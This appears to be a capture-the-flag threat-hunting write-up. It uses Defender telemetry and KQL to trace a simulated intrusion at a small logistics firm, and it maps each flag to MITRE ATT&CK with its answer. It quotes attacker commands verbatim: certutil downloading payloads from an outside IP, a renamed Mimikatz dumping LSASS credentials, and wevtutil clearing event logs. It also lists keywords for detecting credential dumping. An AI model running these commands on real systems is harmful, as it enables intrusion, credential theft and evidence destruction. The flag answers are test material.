# 🕵️ CTF Threat Hunt Report  
# Port of Entry – Azuki Import/Export (梓貿易株式会社)

---

## 📌 Incident Brief

Azuki Import/Export Trading Co., a 23-employee logistics company operating between Japan and Southeast Asia, experienced a suspected corporate espionage incident.

A competing organization undercut a 6-year shipping contract by exactly 3%. Shortly afterward, confidential supplier contracts and pricing data were discovered on underground forums.

This indicates a targeted intrusion and data exfiltration event.

---

## 🏢 Organization Overview

- **Company:** Azuki Import/Export Trading Co.
- **Industry:** Shipping & Logistics
- **Employees:** 23
- **Primary Compromised System:** `AZUKI-SL` (IT Administrator Workstation)
- **Evidence Source:** Microsoft Defender for Endpoint Logs

---

## 🎯 Investigation Objectives

The investigation aimed to determine:

1. What was the initial access method?
2. Which accounts were compromised?
3. What discovery activity occurred?
4. How did the attacker evade defenses?
5. What persistence mechanisms were established?
6. Was credential theft performed?
7. How was data collected and staged?
8. What exfiltration channel was used?
9. Was lateral movement observed?
10. What anti-forensic actions were taken?

---

## 🛠 Tools & Methodology

The investigation was conducted using:

- **Microsoft Defender for Endpoint**
- **Kusto Query Language (KQL)**

Primary log sources analyzed:

- `DeviceLogonEvents`
- `DeviceProcessEvents`
- `DeviceNetworkEvents`
- `DeviceFileEvents`
- `DeviceRegistryEvents`

All findings were derived from event telemetry between: 2025-11-18 through 2025-11-20

---

# 🚩 Flag 1 – Initial Access: Remote Access Source

## 🎯 Objective
Identify the source IP address responsible for the successful Remote Desktop Protocol (RDP) logon to the compromised system.

---

## 🛠 KQL Query Used


DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
| where isnotempty(RemoteIP)
| where ActionType == "LogonSuccess"
| project TimeGenerated, AccountName, LogonType, RemoteIP, DeviceName, ActionType

## 📊 Evidence

Analysis of successful logon events revealed:

- **Timestamp:** 2025-11-19 18:36:21 UTC  
- **Account:** kenji.sato  
- **Logon Type:** Remote/Network Activity  
- **Remote IP:** 88.97.178.12  
- **Device:** azuki-sl  

The IP address `88.97.178.12` is a public external IP address and does not belong to a private internal range.

Subsequent activity from `10.0.8.9` indicates internal movement following the initial compromise.

---

## ❓ Flag 1 Question:
What was the initial access method used by the attacker?

## ✅ Flag 1 Answer: 88.97.178.12


## 🧠 Analysis

The attacker gained unauthorized access to `AZUKI-SL` via Remote Desktop Protocol using valid credentials from external IP address `88.97.178.12`.

This confirms the initial point of compromise and establishes the external origin of the intrusion.

---

## 🧭 MITRE ATT&CK Mapping

- **T1078** – Valid Accounts  
- **T1021.001** – Remote Desktop Protocol

---

# 🚩 Flag 2 – Initial Access: Compromised User Account

## 🎯 Objective
Identify the user account that was compromised and used during the unauthorized Remote Desktop session.

---

## 🛠 KQL Query Used

DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
| where isnotempty(RemoteIP)
| where ActionType == "LogonSuccess"
| project TimeGenerated, AccountName, LogonType, RemoteIP, DeviceName, ActionType

## 📊 Evidence

Analysis of successful authentication events revealed:

- **Timestamp:** 2025-11-19 18:36:21 UTC  
- **Account:** kenji.sato  
- **Logon Type:** Unlock / Network  
- **Remote IP:** 88.97.178.12  
- **Device:** azuki-sl  

The account `kenji.sato` successfully authenticated from the external IP address `88.97.178.12`, which was previously identified as the source of the unauthorized RDP session.

Subsequent logon activity from internal IP `10.0.8.9` indicates continued activity after the initial compromise.

---

## ❓ Flag 2 Question:
Which user account was used to perform the malicious activity?

## ✅ Flag 2 Answer: kenji.sato


## 🧠 Analysis

The account `kenji.sato` was successfully used to authenticate to `AZUKI-SL` from an external IP address.

This confirms:

- Credential compromise  
- Unauthorized remote access  
- Use of valid account authentication  

The attacker leveraged legitimate credentials rather than exploiting a software vulnerability.

---

## 🧭 MITRE ATT&CK Mapping

- **T1078** – Valid Accounts  
- **T1021.001** – Remote Desktop Protocol

---

# 🚩 Flag 3 – Discovery: Network Reconnaissance

## 🎯 Objective
Identify evidence of post-compromise discovery activity performed by the attacker.

---

## 🛠 KQL Query Used

DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:00:00Z) .. datetime(2025-11-21))
| where ProcessCommandLine has_any ("arp", "net view", "nbtstat", "netstat", "ping")
| project TimeGenerated, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AccountName
| order by TimeGenerated asc

---
## 📊 Evidence

The following suspicious process execution was identified:

- **Timestamp:** 2025-11-19 19:04:01 UTC  
- **Process:** ARP.EXE  
- **Command:** `ARP.EXE -a`  
- **Initiating Process:** powershell.exe  
- **Account:** kenji.sato  

The `arp -a` command enumerates the ARP cache to identify other systems on the local network.

The fact that it was executed via `powershell.exe` under the compromised account strongly indicates manual reconnaissance activity.

---

## ❓ Flag 3 Question:
What command was used to perform network reconnaissance on the compromised host?

## ✅ Flag 3 Answer: arp -a


## 🧠 Analysis

After gaining access, the attacker performed local network discovery using:

- ARP table enumeration  

This suggests the attacker was:

- Identifying internal hosts  
- Mapping the local subnet  
- Preparing for potential lateral movement  

The use of PowerShell to launch the command further indicates hands-on-keyboard activity rather than automated system behavior.

---

## 🧭 MITRE ATT&CK Mapping

- **T1016** – System Network Configuration Discovery  
- **T1046** – Network Service Discovery  
- **T1059.001** – PowerShell

---

# 🚩 Flag 4 – Defense Evasion: Hidden Staging Directory

## 🎯 Objective
Identify evidence of defense evasion through the creation or concealment of a hidden directory used for staging.

---

## 🛠 KQL Query Used

DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:00:00Z) .. datetime(2025-11-22))
| where ProcessCommandLine has_any ("mkdir", "md ", "New-Item", "attrib")
| project TimeGenerated, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AccountName
| order by TimeGenerated asc

## 📊 Evidence

The following suspicious command was executed:

- **Timestamp:** 2025-11-19 19:05:33 UTC  
- **Process:** attrib.exe  
- **Command:** `attrib.exe +h +s C:\ProgramData\WindowsCache`  
- **Initiating Process:** powershell.exe  
- **Account:** kenji.sato  

The command applied:

- `+h` → Hidden attribute  
- `+s` → System attribute  

to the directory: C:\ProgramData\WindowsCache

This action hides the directory from standard user view and reduces visibility unless hidden/system files are enabled.

---

## ❓ Flag 4 Question:
What directory was created or modified and then hidden to stage malicious files?

## ✅ Flag 4 Answer: C:\ProgramData\WindowsCache

---

## 🧠 Analysis

The attacker modified the directory attributes to conceal a staging location under `C:\ProgramData`.

This strongly suggests:

- Creation of a hidden staging directory  
- Preparation for data collection or exfiltration  
- Intentional defense evasion  

Using `attrib.exe` with `+h +s` is a common technique to hide malicious artifacts.

---

## 🧭 MITRE ATT&CK Mapping

- **T1564.001** – Hide Artifacts: Hidden Files and Directories  
- **T1059.001** – PowerShell

---

# 🚩 Flag 5 – Defense Evasion: Windows Defender File Extension Exclusions

## 🎯 Objective
Determine how many file extensions were excluded from Windows Defender scanning.

---

## 📊 Evidence

Registry modifications were observed under:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions

The following file extensions were added as exclusions:

- `.bat`
- `.ps1`
- `.exe`

Each entry had the action type:

- `RegistryValueSet`

This confirms that the attacker configured Windows Defender to ignore specific executable and script file types.

---

## ❓ Flag 5 Question:
How many file extensions were excluded from Windows Defender scanning?

## ✅ Flag 5 Answer: 3

---

## 🧠 Analysis

By excluding:

- Batch files (`.bat`)
- PowerShell scripts (`.ps1`)
- Executables (`.exe`)

the attacker ensured that common payload formats would not be scanned or quarantined by Windows Defender.

This significantly increases the success rate of:

- Malicious script execution  
- Payload deployment  
- Persistence mechanisms  

---

## 🧭 MITRE ATT&CK Mapping

- **T1562.001** – Impair Defenses: Disable or Modify Tools  
- **T1112** – Modify Registry

---

# 🚩 Flag 6 – Defense Evasion: Windows Defender Path Exclusion

## 📊 Evidence

Registry modifications were observed under: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths

The following path was added as an exclusion:

- `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

**Action Type:** `RegistryValueSet`

This indicates that the attacker configured Windows Defender to ignore the user’s local Temp directory.

---

## ❓ Flag 6 Question:
Which specific path was excluded from Windows Defender scanning?

## ✅ Flag 6 Answer: C:\Users\KENJI~1.SAT\AppData\Local\Temp

---

## 🧠 Analysis

By excluding the user’s **Temp directory**, the attacker ensured that:

- Dropped payloads would not be scanned  
- Scripts and executables staged in Temp would evade detection  
- Malicious activity could execute with reduced risk of quarantine  

The Temp directory is a common location for:

- Malware staging  
- Script execution  
- Tool deployment  

This strongly indicates deliberate defense evasion before further malicious actions.

---

## 🧭 MITRE ATT&CK Mapping

- **T1562.001** – Impair Defenses: Disable or Modify Tools  
- **T1112** – Modify Registry

---

# 🚩 Flag 7 – Living off the Land Binary (LOLBAS) Used for Payload Download

## 📊 Evidence

Suspicious process execution was identified involving:

- **Process:** `certutil.exe`
- **Command Examples:**
  - `certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`
  - `certutil.exe -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\AdobeGC.exe`
- **Initiating Process:** `powershell.exe`
- **Account:** kenji.sato

The `-urlcache -f` flags indicate that `certutil.exe` was used to download files from a remote server and save them locally.

---

## ❓ Flag 7 Question:
Which Living-off-the-Land Binary (LOLBAS) was used to download payloads?

## ✅ Flag 7 Answer: certutil.exe

---

## 🧠 Analysis

`certutil.exe` is a legitimate Windows utility commonly abused as a **Living off the Land Binary (LOLBAS)**.

In this case, it was used to:

- Download payloads from an external IP address  
- Save them into the previously hidden staging directory  
- Bypass traditional download monitoring mechanisms  

Using `certutil.exe` for file downloads is a well-known attacker technique because:

- It is signed by Microsoft  
- It is commonly allowed through application controls  
- It blends in with legitimate system activity  

This indicates active payload staging and likely malware deployment.

---

## 🧭 MITRE ATT&CK Mapping

- **T1105** – Ingress Tool Transfer  
- **T1218** – Signed Binary Proxy Execution  
- **T1059.001** – PowerShell

---

## 📊 Evidence

A scheduled task creation event was identified using the following query filters:

- `ProcessCommandLine` contains `"schtasks"`
- `ProcessCommandLine` contains `"/create"`

Observed execution:

- **Process:** `schtasks.exe`
- **Command:** schtasks.exe /create /tn "Windows Update Check" /tr ...

- **Initiating Process:** `powershell.exe`
- **Account:** kenji.sato
- **Timestamp:** 2025-11-19 19:07:46 UTC

The `/tn` parameter specifies the task name.

---

# 🚩 Flag 8 – Persistence via Malicious Scheduled Task

## 📊 Evidence

A scheduled task creation event was identified using the following query filters:

- `ProcessCommandLine` contains `"schtasks"`
- `ProcessCommandLine` contains `"/create"`

Observed execution:

- **Process:** `schtasks.exe`
- **Command:**
  - `schtasks.exe /create /tn "Windows Update Check" /tr ...`
- **Initiating Process:** `powershell.exe`
- **Account:** kenji.sato
- **Timestamp:** 2025-11-19 19:07:46 UTC

The `/tn` parameter specifies the task name being created.

---

## ❓ Flag 8 Question:
What was the name of the scheduled task created by the attacker?

## ✅ Flag 8 Answer: Windows Update Check

---

## 🧠 Analysis

The attacker used `schtasks.exe` to create a scheduled task named **"Windows Update Check"** as a persistence mechanism.

This technique allows:

- Automatic execution of malicious payloads  
- Execution at system startup or scheduled intervals  
- Long-term access without manual re-entry  

The task name was intentionally chosen to appear legitimate and blend in with normal Windows system activity, reducing the likelihood of detection during administrative review.

---

## 🧭 MITRE ATT&CK Mapping

- **T1053.005** – Scheduled Task/Job: Scheduled Task  
- **T1547** – Boot or Logon Autostart Execution  
- **T1059.001** – PowerShell

---

# 🚩 Flag 9 – Malicious Payload Executed via Scheduled Task

## 📊 Evidence

The scheduled task creation command reveals the execution path of the payload.

Observed execution:

- **Process:** `schtasks.exe`
- **Command:**
  - `schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily ...`
- **Initiating Process:** `powershell.exe`
- **Account:** kenji.sato
- **Timestamp:** 2025-11-19 19:07:46 UTC

The `/tr` parameter specifies the program that the scheduled task will run.

The configured task is set to execute: C:\ProgramData\WindowsCache\svchost.exe

---

## ❓ Flag 9 Question:
What executable file was configured to run via the malicious scheduled task?

## ✅ Flag 9 Answer: C:\ProgramData\WindowsCache\svchost.exe

---

## 🧠 Analysis

The attacker configured the scheduled task to execute a malicious binary disguised as `svchost.exe`.

Key observations:

- The file resides in `C:\ProgramData\WindowsCache`, a previously hidden staging directory.
- The filename mimics a legitimate Windows system process.
- The task was set to run on a daily schedule, establishing persistent execution.

Using a trusted system process name combined with a non-standard directory is a common evasion technique designed to avoid detection during casual inspection.

This confirms successful payload deployment and persistence.

---

## 🧭 MITRE ATT&CK Mapping

- **T1053.005** – Scheduled Task/Job: Scheduled Task  
- **T1036** – Masquerading  
- **T1547** – Boot or Logon Autostart Execution

---
# 🚩 Flag 10 – Command-and-Control (C2) Communication Identified

## 📊 Evidence

Network connection events were analyzed using the following filters:

- `DeviceName == "azuki-s1"`
- `InitiatingProcessFileName` contains `"svchost.exe"` or `"mm.exe"`

Observed suspicious outbound connection:

- **Timestamp:** 2025-11-19 19:11:04 UTC  
- **Remote IP:** 78.141.196.6  
- **Remote Port:** 443  
- **Initiating Process:** `svchost.exe`

While other connections were made to legitimate Microsoft endpoints, this external IP stands out as unknown and previously associated with payload delivery activity.

The malicious `svchost.exe` (running from the staged directory) initiated communication to this remote address over HTTPS (port 443).

---

## ❓ Flag 10 Question:
What external IP address was used for command-and-control communication?

## ✅ Flag 10 Answer: 78.141.196.6

---

## 🧠 Analysis

After establishing persistence, the malicious `svchost.exe` began outbound communication to **78.141.196.6** over port 443.

Key indicators:

- Communication occurred shortly after scheduled task execution.
- The IP address was previously used for payload hosting.
- The connection originated from the masqueraded `svchost.exe` binary located in `C:\ProgramData\WindowsCache`.

This behavior strongly indicates command-and-control (C2) activity, allowing the attacker to:

- Issue remote commands  
- Exfiltrate data  
- Maintain control of the compromised host  

The use of port 443 helps blend malicious traffic with normal HTTPS activity.

---

## 🧭 MITRE ATT&CK Mapping

- **T1071.001** – Application Layer Protocol: Web Protocols  
- **T1105** – Ingress Tool Transfer  
- **T1036** – Masquerading

---

# 🚩 Flag 11 – Port Used for Command-and-Control Communication

## 📊 Evidence

Network connection events show outbound traffic initiated by the malicious `svchost.exe`.

Observed suspicious connection:

- **Timestamp:** 2025-11-19 19:11:04 UTC  
- **Remote IP:** 78.141.196.6  
- **Remote Port:** 443  
- **Initiating Process:** `svchost.exe`

Multiple connections to the same external IP were observed over port **443**, indicating encrypted HTTPS communication.

---

## ❓ Flag 11 Question:
What port was used for command-and-control communication?

## ✅ Flag 11 Answer: 443

---

## 🧠 Analysis

The malicious binary communicated with the external C2 server over **port 443**, which is commonly used for HTTPS traffic.

Using port 443 provides several advantages to attackers:

- Blends malicious traffic with legitimate encrypted web traffic  
- Bypasses strict firewall rules that allow outbound HTTPS  
- Makes inspection more difficult without SSL/TLS decryption  

This confirms that encrypted web traffic was used to maintain command-and-control communications.

---

## 🧭 MITRE ATT&CK Mapping

- **T1071.001** – Application Layer Protocol: Web Protocols  
- **T1573** – Encrypted Channel

---

# 🚩 Flag 12 – Credential Dumping Tool Identified

## 📊 Evidence

Process execution logs were filtered for known credential dumping indicators:

- `ProcessCommandLine` contains:
  - `"sekurlsa"`
  - `"logonpasswords"`
  - `"lsadump"`
  - `"minidump"`
  - `"mimikatz"`
  - `"pass-the-hash"`

Observed event:

- **Timestamp:** 2025-11-19 19:08:26 UTC  
- **Process:** `mm.exe`  
- **Command:**
  - `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
- **Account:** kenji.sato  

The command includes `sekurlsa::logonpasswords`, a well-known Mimikatz module used to dump credentials from memory.

---

## ❓ Flag 12 Question:
What executable was used to perform credential dumping?

## ✅ Flag 12 Answer: mm.exe

---

## 🧠 Analysis

The attacker executed `mm.exe`, which is likely a renamed version of **Mimikatz**, to perform credential dumping.

Indicators:

- Use of `privilege::debug`
- Use of `sekurlsa::logonpasswords`
- Execution under the compromised user account

Renaming Mimikatz to `mm.exe` is a common evasion tactic to:

- Avoid signature-based detection  
- Bypass basic process-name monitoring  
- Blend in with legitimate-looking executables  

This confirms that the attacker escalated their capabilities by harvesting credentials from LSASS memory.

---

## 🧭 MITRE ATT&CK Mapping

- **T1003.001** – OS Credential Dumping: LSASS Memory  
- **T1555** – Credentials from Password Stores  
- **T1036** – Masquerading

---

# 🚩 Flag 13 – Credential Dumping Module Used

## 📊 Evidence

Process execution logs reveal the specific Mimikatz module used during credential dumping.

Observed event:

- **Timestamp:** 2025-11-19 19:08:26 UTC  
- **Process:** `mm.exe`  
- **Command:**
  - `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
- **Account:** kenji.sato  

The command clearly includes: sekurlsa::logonpasswords

This module is commonly used to extract plaintext credentials and NTLM hashes from LSASS memory.

---

## ❓ Flag 13 Question:
Which credential dumping module was executed?

## ✅ Flag 13 Answer: sekurlsa::logonpasswords

---

## 🧠 Analysis

The attacker used the `sekurlsa::logonpasswords` module within Mimikatz to extract credentials from memory.

Key details:

- `privilege::debug` enables necessary debug privileges.
- `sekurlsa::logonpasswords` targets LSASS memory.
- Credentials retrieved may include:
  - Plaintext passwords  
  - NTLM hashes  
  - Kerberos tickets  

This technique allows attackers to escalate privileges and move laterally within the environment.

The use of a renamed binary (`mm.exe`) combined with direct module invocation indicates deliberate credential harvesting activity.

---

## 🧭 MITRE ATT&CK Mapping

- **T1003.001** – OS Credential Dumping: LSASS Memory  
- **T1558** – Steal or Forge Kerberos Tickets  
- **T1036** – Masquerading

---

# 🚩 Flag 14 – Staged Data Archive Identified

## 📊 Evidence

File creation events were reviewed for archive files using the following filters:

- `ActionType == "FileCreated"`
- `FileName` ends with:
  - `.cab`
  - `.zip`
  - `.7z`

Observed suspicious file creation:

- **Timestamp:** 2025-11-19 19:08:58 UTC  
- **File Name:** `export-data.zip`  
- **Folder Path:** `C:\ProgramData\WindowsCache\`  
- **File Size:** 4763 bytes  

The archive was created in the same staging directory used earlier for malicious payload storage.

---

## ❓ Flag 14 Question:
What was the name of the archive file created for data staging?

## ✅ Flag 14 Answer: export-data.zip

---

## 🧠 Analysis

The attacker created `export-data.zip`, likely to package collected data for exfiltration.

Key indicators:

- File created shortly after credential dumping activity.
- Located in `C:\ProgramData\WindowsCache`, the established attacker staging directory.
- Naming suggests intentional data collection and preparation.

This behavior aligns with common attacker workflow:

1. Harvest credentials  
2. Collect sensitive data  
3. Compress into an archive  
4. Prepare for exfiltration  

This confirms progression from credential access to data staging.

---

## 🧭 MITRE ATT&CK Mapping

- **T1560.001** – Archive Collected Data: Archive via Utility  
- **T1074.001** – Data Staged: Local Data Staging  
- **T1003.001** – OS Credential Dumping

---

# 🚩 Flag 15 – Data Exfiltration Destination Identified

## 📊 Evidence

Network events were analyzed for connections to common file-sharing and cloud storage services:

Domains monitored included:

- dropbox
- drive.google
- onedrive
- mega
- discord
- slack
- wetransfer
- box.com
- gofile
- file.io

Query results:

- **onedrive.live.com** – 334 connections (likely legitimate activity)
- **discord.com** – 1 connection

The presence of `discord.com` indicates potential data exfiltration via a public messaging/file-sharing platform.

---

## ❓ Flag 15 Question:
Which platform was used for data exfiltration?

## ✅ Flag 15 Answer: discord

---

## 🧠 Analysis

While OneDrive showed high connection volume, this is typically expected in enterprise environments.

However, a connection to **discord.com** stands out because:

- Discord is commonly abused for malware C2 and data exfiltration.
- It allows file uploads via HTTPS (port 443).
- Traffic blends with normal encrypted web activity.
- It is often not blocked in enterprise networks.

Given prior activity:

1. Credential dumping (`mm.exe`)
2. Archive creation (`export-data.zip`)
3. External communications over HTTPS

The Discord connection strongly indicates data exfiltration.

---

## 🧭 MITRE ATT&CK Mapping

- **T1567.002** – Exfiltration to Cloud Storage  
- **T1041** – Exfiltration Over C2 Channel  
- **T1071.001** – Application Layer Protocol: Web Protocols

---

# 🚩 Flag 16 – Cleared Windows Event Log Identified

## 📊 Evidence

Process execution logs were filtered for `wevtutil.exe` usage with the `cl` (clear log) argument.

Observed commands:

- `"wevtutil" cl "Security"`
- `"wevtutil" cl "System"`
- `"wevtutil" cl "Application"`
- `"wevtutil" cl "Microsoft-Windows-PowerShell/Operational"`

The first log cleared was:

- **Security**

---

## ❓ Flag 16 Question:
Which Windows event log was cleared?

## ✅ Flag 16 Answer: Security

---

## 🧠 Analysis

The attacker used `wevtutil.exe cl` to clear multiple Windows event logs.

Clearing the **Security** log is particularly significant because it contains:

- Logon events  
- Account activity  
- Privilege escalation events  
- Audit logs  

This indicates deliberate anti-forensics activity to remove evidence of:

- Credential dumping  
- Privilege escalation  
- Suspicious logins  

Clearing event logs is a common defense evasion tactic used near the end of an intrusion.

---

## 🧭 MITRE ATT&CK Mapping

- **T1070.001** – Indicator Removal on Host: Clear Windows Event Logs  
- **T1562.001** – Impair Defenses

---

